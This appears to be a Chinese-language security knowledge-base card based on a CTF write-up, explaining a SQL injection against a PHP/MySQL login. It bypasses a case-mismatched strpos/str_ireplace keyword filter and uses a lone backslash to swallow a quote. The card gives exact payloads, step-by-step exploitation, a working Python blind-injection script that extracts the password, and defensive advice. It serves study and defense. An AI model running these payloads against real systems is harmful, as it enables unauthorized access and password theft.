---
id: web-generic-sqli-case-sensitive-blacklist-backslash-blind-ascii
title: 大小写敏感关键字检测 + 反斜杠吞引号：大写绕过 strpos/str_ireplace 组合后用 ASCII()>c 盲注读密码
type: scenario
domain: web
path: web/generic/sqli
technique: sqli-case-sensitive-blacklist-backslash-blind-ascii
tags:
- sqli
- waf-bypass
- mysql
- blind
- ascii
- backslash
- php
- case-sensitivity
cve: []
severity: high
confidence: medium
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V297
  verified_at: '2026-11-08T08:21:36+08:00'
  notes: 已对照原文与全部25张图核对：waf()用strpos检测+str_ireplace替换、contain()对strpos=0假值、username单个反斜杠吞引号、password||asCii(sUBstr((seLEct PassWord from user),i,1))>c盲注脚本、末尾\x00截断，均与原文源码/脚本（图09）一致。未验证点：未实际请求目标；原文未展示最终密码结果；表列名user.PassWord依赖源码。
url: /docs/web/generic/sqli/web-generic-sqli-case-sensitive-blacklist-backslash-blind-ascii/
draft: false
kb_aliases:
- 武功山杯 禅蕴杨岐
- strpos 大小写绕过
- str_ireplace 递归替换绕过
- 反斜杠转义引号注入
- ASCII 布尔盲注
---

## 一句话结论

WAF 用区分大小写的 `strpos` 检测黑名单关键字、只在命中后才用 `str_ireplace` 做大小写不敏感替换，提交 `seLEct`/`asCii`/`sUBstr` 这类混合大小写关键字即可原样进入 SQL；同时用户名填单个反斜杠 `1\` 会吞掉 SQL 中 `username='...'` 的闭合单引号，使 password 字段的 `|| asCii(sUBstr((seLEct PassWord from user),i,1))>c;` 变成布尔表达式，按字符 ASCII 值二分即可盲注出密码并登录。

## 原理

- **检测与替换的大小写错配**：`waf()` 先用 `contain($str,$a)`（内部 `strpos`，区分大小写）判断是否含小写关键字，只有返回真才调用 `lvlarrep()`（`str_ireplace`，不区分大小写）删除关键字。混合大小写输入（如 `seLEct`、`asCii`、`sUBstr`、`PassWord`）对 `strpos` 不匹配小写黑名单词，因此完全跳过替换，原样拼进 SQL。
- **`strpos` 位置 0 的假值缺陷**：`contain()` 直接 `if ($strpos_res) return true;`，当关键字正好出现在字符串开头时 `strpos` 返回 `0`（假值），同样判定为“不含”，形成第二个绕过点。
- **反斜杠逃逸**：代码只把两个字段里的单引号替换为 `&#39;`，没有处理反斜杠。SQL 为 `SELECT * FROM user WHERE \`username\` = '$username' AND \`password\` = '$password';`；username 取 `1\` 时，`username = '1\'` 里的反斜杠把闭合单引号转义，字符串字面量继续吞掉 ` AND password = '`，password 字段的内容就落在 SQL 表达式位置。
- **布尔表达式注入**：password 传 `||asCii(sUBstr((seLEct PassWord from user ),{i},1))>{c};\x00`。MySQL 中 `||` 是逻辑 OR；比较为真则整行条件成立、`mysqli_num_rows>0` 返回“登陆成功”，为假则“哦欧！”。末尾 `\x00` 截断残余的 `';`。脚本对每位字符做二分（0..127）即可还原大小写敏感的密码。
- **为什么成立**：过滤只做字符串黑名单且检测/替换逻辑不一致，没有参数化查询；反斜杠在 MySQL 字符串转义中有特殊含义，而应用只转义引号，二者组合破坏了查询结构。

## 触发条件

- PHP + MySQL（mysqli）登录接口，SQL 由单引号字符串拼接，未使用预处理语句。
- WAF 采用“区分大小写检测 + 不区分大小写替换”的组合（或类似的 `strpos`/`str_ireplace` 错配），且未拦截反斜杠。
- 用户名/密码字段中的单引号被替换但不处理反斜杠；数据库存在可猜的表/列（本例 `user.PassWord`）。
- 登录成功/失败响应可区分（布尔 oracle），可用脚本高频请求。
- 源码可通过 `.index.php.swp` 等备份/交换文件泄露，帮助确认过滤逻辑与表列名。

## 利用步骤

1. 扫描发现 `.index.php.swp`，恢复源码，确认 `waf()` 的 `strpos`/`str_ireplace` 错配和 SQL 拼接方式。
2. 构造 username=`1\`、password=`||asCii(sUBstr((seLEct PassWord from user ),{i},1))>{c};\x00`，POST 时带 `login=1`。
3. 对第 i 位字符在 0..127 间二分：响应含“成功”则条件为真，抬高下界；否则降低上界。
4. 逐位得到密码（区分大小写），用该密码正常登录拿 flag。
5. 若关键字被更严格过滤，换用其他大小写组合或等价函数（`ORD`、`MID`、`LEFT`、比较运算、`LIKE` 等）。

## PoC

原文脚本（二分 ASCII 盲注）：

```python
import requests

url = "http://target/"
sql = 'seLEct PassWord from user '
FLAG = ''

for i in range(1, 100):
    a, b = 0, 127
    c = (a + b) // 2
    while True:
        P = {"username": "1\\",
             "password": f"||asCii(sUBstr(({sql}),{i},1))>{c};\x00",
             "login": "1"}
        R = requests.post(url, data=P)
        if '成功' in R.text:
            a = c
            c = (a + b) // 2
        else:
            b = c
            c = (a + b) // 2
        if c == 1:
            break
        elif (b - a) <= 1:
            FLAG += chr(b)
            break

print(FLAG)
```

要点：username 末尾必须是单个反斜杠；password 里的关键字用混合大小写；末尾 `\x00` 用于截断。

## 变体与关联

- **同缺陷的变体**：检测用 `strpos`/`stripos`、替换用 `str_replace`/`str_ireplace` 时，只要两者大小写策略不一致，就可能存在同样的绕过；关键字在开头时 `strpos=0` 也会让检测失效。
- **引号处理不同的变体**：若应用同时过滤反斜杠，可改用数字型注入、宽字节、注释符或 hex/CHAR 构造；本卡的核心是“过滤逻辑不一致”，不限于反斜杠。
- **盲注 oracle 变体**：`ASCII()>c` 二分、`SUBSTR(...)='a'`、`LIKE`、时间盲注、报错注入均可替换；已知同族卡 `web-generic-sqli-blind-ascii-case-restore-login` 讨论的是比较时大小写排序规则导致还原错误，本卡是过滤层绕过，二者互补。
- **关联卡**：`web-generic-sqli-backslash-quote-blacklist-hex-union-session-ssti` 同样利用反斜杠吞引号，但后续是 UNION 回显 + session + SSTI；本卡后续是 ASCII 布尔盲注，利用目标和回显方式不同。

## 检测与防御

- 使用预处理语句/参数化查询，彻底消除字符串拼接；不要在 SQL 中依赖手动转义引号。
- 黑名单过滤必须统一大小写策略（检测与替换都 `stripos`/`str_ireplace`），并对反斜杠、注释符、空白做规范化；但黑名单本身不是安全边界。
- 关闭详细错误回显，避免泄露 SQL/表结构；对登录失败响应做统一化，降低布尔 oracle 可观测性。
- 清理 Web 目录中的 `.swp`、`.bak`、源码压缩包等备份文件，避免过滤逻辑与表结构泄露。
- 监控同一 IP 对登录接口的高频、逐位变化的 password 参数（ASCII 比较特征）。
